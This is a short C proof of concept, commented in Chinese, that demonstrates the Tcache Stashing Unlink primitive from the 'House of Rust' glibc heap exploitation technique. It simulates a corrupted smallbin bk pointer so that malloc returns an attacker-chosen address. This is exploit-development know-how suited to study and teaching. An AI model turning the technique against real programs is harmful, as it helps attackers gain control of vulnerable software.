/*
 * House of Rust 使用的标准 TSU 子原语，适用于 glibc 2.32～2.40。
 *
 * 漏洞模型：可以修改已经进入 smallbin 的 chunk->bk。
 * 成功效果：smallbin stashing 把伪节点放入 tcache，malloc 返回 fake[2]。
 */

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    __attribute__((aligned(16))) size_t fake[16] = {0};
    size_t *chunk[9] = {0};
    size_t *result;

    setbuf(stdout, NULL);

    /* 申请九次 0x90，对应九个 0xa0 物理大小的 chunk。 */
    for (int i = 0; i < 9; i++)
        chunk[i] = malloc(0x90);

    /* 先释放六个 chunk。 */
    for (int i = 3; i < 9; i++)
        free(chunk[i]);

    /* 第七次 free 正好填满这个尺寸的 tcache。 */
    free(chunk[1]);

    /* tcache 已经满了，chunk[0] 和 chunk[2] 只能进入 unsorted bin。 */
    free(chunk[0]);
    free(chunk[2]);

    /* 这次 0xb0 物理大小的请求用不到它们，会把它们分流进 0xa0 的 smallbin。 */
    malloc(0xa0);

    /* 取走两个 tcache 节点，给 stashing 留出两个空槽位。 */
    malloc(0x90);
    malloc(0x90);

    /* fake[2] 是我们希望 malloc 最终返回的位置，fake[3] 对应伪节点的 bk 字段。 */
    fake[3] = (size_t)&fake[2];

    /* 漏洞模拟：chunk[2][1] 正好就是 smallbin victim 的 bk。 */
    chunk[2][1] = (size_t)fake;

    /* calloc 会触发 smallbin 的解链和向 tcache 的 stashing 过程。 */
    calloc(1, 0x90);

    /* 下一次 malloc 就会从 tcache 里取出我们伪造的节点。 */
    result = malloc(0x90);

    assert(result == &fake[2]);
    printf("[+] TSU 返回目标\n");
    return 0;
}
